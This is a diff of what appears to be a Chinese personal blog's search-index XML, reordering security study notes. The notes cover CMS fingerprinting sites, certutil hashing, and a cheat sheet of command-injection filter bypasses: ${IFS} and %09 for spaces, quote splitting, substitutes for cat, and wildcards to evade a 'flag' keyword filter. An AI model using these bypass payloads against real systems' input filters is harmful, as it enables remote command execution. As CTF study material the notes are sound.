-<p>注意后面有个MD5,不然会生成一个其他的值。</p>
 ]]></content>
       <categories>
         <category>网安基础篇</category>
@@ -2162,6 +2139,48 @@ include('files/'.$action.'.php'); //载入相应文件
       </tags>
   </entry>
   <entry>
+    <title>网安基础总结三</title>
+    <url>/2022/05/08/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%B8%89/</url>
+    <content><![CDATA[<h2 id="思考总结"><a href="#思考总结" class="headerlink" title="思考总结"></a>思考总结</h2><p>1.cms指纹识别在线识别</p>
+<p>[BugScaner]<a href="http://whatweb.bugscaner.com/look/]">http://whatweb.bugscaner.com/look/</a></p>
+<p>[云悉指纹]<a href="http://www.yunsee.cn/finger.html]">http://www.yunsee.cn/finger.html</a></p>
+<p>[whatweb]<a href="https://whatweb.net/]">https://whatweb.net/</a> </p>
+<span id="more"></span>
+
+<p>2.在<a href="https://so.csdn.net/so/search?q=cmd&spm=1001.2101.3001.7020">cmd</a>下进入 要查看的文件目录</p>
+<p>然后输入命令</p>
+<p>certutil -hashfile  文件名称.文件类型 <a href="https://so.csdn.net/so/search?q=MD5&spm=1001.2101.3001.7020">MD5</a></p>
+<p>如</p>
+<p>certutil -hashfile  webpro.war MD5</p>
+<p>注意后面有个MD5,不然会生成一个其他的值。</p>
+]]></content>
+      <categories>
+        <category>网安基础篇</category>
+      </categories>
+      <tags>
+        <tag>web基础</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>网安基础总结五</title>
+    <url>/2022/07/17/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%BA%94/</url>
+    <content><![CDATA[<h1 id="rce-远程命令-代码执行漏洞"><a href="#rce-远程命令-代码执行漏洞" class="headerlink" title="rce 远程命令/代码执行漏洞"></a>rce 远程命令/代码执行漏洞</h1><h5 id="反引号"><a href="#反引号" class="headerlink" title="反引号``"></a>反引号``</h5><p>反引号即命令替换 是指Shell可以先执行中的命令，将输出结果暂时保存，在适当的地方输出。</p>
+<span id="more"></span>
+
+<h5 id="单引号，双引号"><a href="#单引号，双引号" class="headerlink" title="单引号，双引号"></a>单引号，双引号</h5><p>适用条件:过滤了字符串<br>放在shell命令中，绕过正则匹配且不影响原意</p>
+<h5 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h5><p>&lt; &lt;&gt; 重定向符<br>%09(需要php环境)<br>${IFS}<br>$IFS$9<br>{cat,flag.php} //用逗号实现了空格功能<br>%20<br>%09</p>
+<h5 id="读文件绕过-cat绕过"><a href="#读文件绕过-cat绕过" class="headerlink" title="读文件绕过(cat绕过)"></a>读文件绕过(cat绕过)</h5><p>适用条件:过滤了cat<br>1)more:一页一页的显示档案内容<br>(2)less:与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页<br>(3)head:查看头几行<br>(4)tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示<br>(5)tail:查看尾几行<br>(6)nl：显示的时候，顺便输出行号<br>(7)od:以二进制的方式读取档案内容<br>(8)vi:一种编辑器，这个也可以查看<br>(9)vim:一种编辑器，这个也可以查看<br>(10)sort:可以查看<br>(11)uniq:可以查看<br>(12)file -f:报错出具体内容<br>grep grep test *file #在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行</p>
+<h5 id="linux通配符绕过"><a href="#linux通配符绕过" class="headerlink" title="linux通配符绕过"></a>linux通配符绕过</h5><p>适用条件:过滤了flag，没有过滤 ? *<br>在linux系统中 有一些通配符</p>
+<p>匹配任何字符串／文本，包括空字符串；*代表任意字符（0个或多个） ls file *<br>? 匹配任何一个字符（不在括号内时）?代表任意1个字符 ls file 0<br>[abcd] 匹配abcd中任何一个字符<br>[a-z] 表示范围a到z，表示范围的意思 []匹配中括号中任意一个字符 ls file 0</p>
+]]></content>
+      <categories>
+        <category>网安基础篇</category>
+      </categories>
+      <tags>
+        <tag>web基础</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>网安基础总结二</title>
     <url>/2022/05/01/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%BA%8C/</url>
     <content><![CDATA[<p><strong>本周重点</strong></p>
@@ -2285,25 +2304,6 @@ include('files/'.$action.'.php'); //载入相应文件
 <ul>
 <li><strong>注：平常安装的burp suite只能抓取   http://   不能抓取   https://</strong></li>
 </ul>
-]]></content>
-      <categories>
-        <category>网安基础篇</category>
-      </categories>
-      <tags>
-        <tag>web基础</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>网安基础总结五</title>
-    <url>/2022/07/17/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%BA%94/</url>
-    <content><![CDATA[<h1 id="rce-远程命令-代码执行漏洞"><a href="#rce-远程命令-代码执行漏洞" class="headerlink" title="rce 远程命令/代码执行漏洞"></a>rce 远程命令/代码执行漏洞</h1><h5 id="反引号"><a href="#反引号" class="headerlink" title="反引号``"></a>反引号``</h5><p>反引号即命令替换 是指Shell可以先执行中的命令，将输出结果暂时保存，在适当的地方输出。</p>
-<span id="more"></span>
-
-<h5 id="单引号，双引号"><a href="#单引号，双引号" class="headerlink" title="单引号，双引号"></a>单引号，双引号</h5><p>适用条件:过滤了字符串<br>放在shell命令中，绕过正则匹配且不影响原意</p>
-<h5 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h5><p>&lt; &lt;&gt; 重定向符<br>%09(需要php环境)<br>${IFS}<br>$IFS$9<br>{cat,flag.php} //用逗号实现了空格功能<br>%20<br>%09</p>
-<h5 id="读文件绕过-cat绕过"><a href="#读文件绕过-cat绕过" class="headerlink" title="读文件绕过(cat绕过)"></a>读文件绕过(cat绕过)</h5><p>适用条件:过滤了cat<br>1)more:一页一页的显示档案内容<br>(2)less:与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页<br>(3)head:查看头几行<br>(4)tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示<br>(5)tail:查看尾几行<br>(6)nl：显示的时候，顺便输出行号<br>(7)od:以二进制的方式读取档案内容<br>(8)vi:一种编辑器，这个也可以查看<br>(9)vim:一种编辑器，这个也可以查看<br>(10)sort:可以查看<br>(11)uniq:可以查看<br>(12)file -f:报错出具体内容<br>grep grep test *file #在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行</p>
-<h5 id="linux通配符绕过"><a href="#linux通配符绕过" class="headerlink" title="linux通配符绕过"></a>linux通配符绕过</h5><p>适用条件:过滤了flag，没有过滤 ? *<br>在linux系统中 有一些通配符</p>
-<p>匹配任何字符串／文本，包括空字符串；*代表任意字符（0个或多个） ls file *<br>? 匹配任何一个字符（不在括号内时）?代表任意1个字符 ls file 0<br>[abcd] 匹配abcd中任何一个字符<br>[a-z] 表示范围a到z，表示范围的意思 []匹配中括号中任意一个字符 ls file 0</p>
 ]]></content>
       <categories>
         <category>网安基础篇</category>
